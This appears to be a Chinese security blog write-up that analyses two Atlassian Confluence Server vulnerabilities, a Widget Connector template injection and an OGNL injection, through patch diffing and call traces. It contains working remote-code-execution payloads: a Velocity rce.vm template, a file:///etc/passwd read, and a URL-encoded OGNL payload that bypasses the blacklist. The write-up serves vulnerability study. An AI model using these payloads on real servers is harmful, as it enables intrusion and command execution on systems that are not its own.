> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10736#toc-3)

> 先知社区，先知安全技术社区

[https://jira.atlassian.com/browse/CONFSERVER-57974](https://jira.atlassian.com/browse/CONFSERVER-57974)

影响版本
----

version < 6.6.12

6.7.0 <= version < 6.12.3

6.13.0 <= version < 6.13.3

6.14.0 <= version < 6.14.2

修复版本：6.6.12， 6.13.3， 6.14.2， 6.15.1， 6.12.3， 6.10.3

漏洞分析
----

这里环境搭建用了 [vulhub 的环境](https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2019-3396/README.zh-cn.md)，版本为

Confluence Server 6.10.2

Widget Connector 是 Confluence 的一个插件，对比一下修复前后的插件

左 Confluence 6.13.0 右 6.13.3

widgetconnector-3.1.0.jar!\com\atlassian\confluence\extra\widgetconnector\WidgetMacro.class

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211206174001735.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211206174001735.png)

可以看见补丁在这里加了一个过滤函数，函数内容为遍历 sanitizeFields 并从 paramters 中删除对应字段，这里只有一个_template，那么补丁就是删除了 parameters 中的_template 字段

然后应该去看文档，寻找用了 Widget Connector 的操作

[https://support.atlassian.com/confluence-cloud/docs/insert-the-widget-connector-macro/](https://support.atlassian.com/confluence-cloud/docs/insert-the-widget-connector-macro/)

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211206175147036.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211206175147036.png)

抓包得到 post 数据

```
{"contentId":"98368","macro":{"name":"widget","params":{"url":"https://www.youtube.com/watch?v=k6lK5hlB1nQ","width":"100","height":"100"},"body":""}}
```

url 不为空则进入`this.renderManager.getEmbeddedHtml(url, parameters)`

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211206175421487.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211206175421487.png)

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211206175552406.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211206175552406.png)

DefaultRenderManager#getEmbeddedHtml

这里的会根据输入的 url，遍历这几个 WidgetRenderer 匹配 url，匹配到就进入对应 WidgetRenderer 的 getEmbeddedHtml 方法

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207145743791.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207145743791.png)

如这里 YoutubeRenderer，匹配成功

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207145938059.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207145938059.png)

然后进入 YoutubeRenderer#getEmbeddedHtml

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207150027699.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207150027699.png)

之所以会输入 youtube 的 url 是因为 YoutubeRenderer 的参数设置函数中的_template 可控

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207150232787.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207150232787.png)

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207150345844.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207150345844.png)

继续往下

```
loadResource:322, ConfigurableResourceManager (com.atlassian.confluence.util.velocity)
getResource:297, ConfigurableResourceManager (com.atlassian.confluence.util.velocity)
getTemplate:1399, RuntimeInstance (org.apache.velocity.runtime)
getTemplate:422, VelocityEngine (org.apache.velocity.app)
getTemplate:89, VelocityUtils (com.atlassian.confluence.util.velocity)
renderTemplateWithoutSwallowingErrors:75, VelocityUtils (com.atlassian.confluence.util.velocity)
getRenderedTemplateWithoutSwallowingErrors:59, VelocityUtils (com.atlassian.confluence.util.velocity)
getRenderedTemplate:38, VelocityUtils (com.atlassian.confluence.util.velocity)
getRenderedTemplate:29, VelocityUtils (com.atlassian.confluence.util.velocity)
getRenderedTemplate:78, DefaultVelocityRenderService (com.atlassian.confluence.extra.widgetconnector.services)
render:72, DefaultVelocityRenderService (com.atlassian.confluence.extra.widgetconnector.services)
```

直到 ConfigurableResourceManager#loadResource

这里会循环 this.resourceLoaders 来加载资源，分别为

`com.atlassian.confluence.setup.velocity.HibernateResourceLoader ORM资源加载器`

`org.apache.velocity.runtime.resource.loader.FileResourceLoader 文件读取`

`org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader 文件加载`

`com.atlassian.confluence.setup.velocity.DynamicPluginResourceLoader 动态插件资源加载器`

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207151217676.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207151217676.png)

所以看 FileResourceLoader 和 ClasspathResourceLoader 的 getResourceStream 方法就行了

FileResourceLoader#getResourceStream

这里有过滤函数

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207152101159.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207152101159.png)

循环判断是否以 /../ 开头

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207152515280.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207152515280.png)

所以 FileResourceLoader#getResourceStream 不能跨目录读文件，只能读安装路径下的文件

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207153032139.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207153032139.png)

看另外一个加载器 ClasspathResourceLoader#getResourceStream

这次将_template 改为 file:///etc/passwd

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207153236976.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207153236976.png)

ClassUtils#getResourceAsStream

前几个 ClassLoader 都无法加载，最终需要调用 ParallelWebappClassLoader 的 getResourceAsStream

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207153518403.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207153518403.png)

最终会调用到 WebappClassLoaderBase#getResourceAsStream

617 行在获取 resource 时，路径会被拼接为`/WEB-INF/classes/file:/etc/passwd`，找不到该 resource 那么 stream=null，进入 625 行，这里调用了父类的 findResource，也就是 URLClassLoader 来返回一个 url 资源，这里支持 file https ftp 等协议，627 行返回 URL 资源不为空则获取内容

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207161022310.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207161022310.png)

最终将数据封装入 Template 一路返回渲染 vm 模板

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207161826315.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207161826315.png)

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207161917704.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207161917704.png)

所以这里可以控制 vm 模板中的内容造成模板注入

rce.vm

```
#set ($exp="exp")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end


```

这里用 ftp 协议，python -m pyftpdlib -p 8888

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211207162059148.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211207162059148.png)

[https://jira.atlassian.com/browse/CONFSERVER-67940](https://jira.atlassian.com/browse/CONFSERVER-67940)

影响版本
----

*   version < 6.13.23
*   6.14.0 ≤ version < 7.4.11
*   7.5.0 ≤ version < 7.11.5
*   7.12.0 ≤ version < 7.12.5

漏洞分析
----

补丁应该是把 queryString 的 ognl 取值去掉了

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211208143711219.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211208143711219.png)

因为这里是 ognl 表达式注入，所以可以把断点打到

OgnlValueStack#findValue

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211208145914493.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211208145914493.png)

调用栈大致可以分为

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211208150341339.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211208150341339.png)

在 getValue 前一步有安全检查

webwork-2.1.5-atlassian-3.jar!\com\opensymphony\webwork\util\OgnlValueFinder.class

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211208150514014.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211208150514014.png)

32 行这里会对表达式进行编译 (解析 unicode) 然后放入 containsUnsafeExpression 检查

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211208151154785.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211208151154785.png)

具体内容黑名单如下

> 1.  第一个 hashset 限制了静态方法、字段、构造方法
> 2.  第二个和第三个 hashset 限制了获取 classloader，如：xxx.class 或者 xxx.getClass()
> 3.  第四个 hashset 限制了编译后的结果中不能出现特定的变量

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211208151253156.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211208151253156.png)

可以用反射绕过，然后就是 ognl 注入了，由于要逃逸 expr 的单引号，而直接传单引号会被 html 实体编码，所以可以利用 OgnlUtil.compile 解析 unicode 绕

[![](https://gitee.com/w4nder/imgs/raw/master/image-20211208152559743.png)](https://gitee.com/w4nder/imgs/raw/master/image-20211208152559743.png)

payload

`queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu002`

[https://paper.seebug.org/893/](https://paper.seebug.org/893/)

[https://paper.seebug.org/884/](https://paper.seebug.org/884/)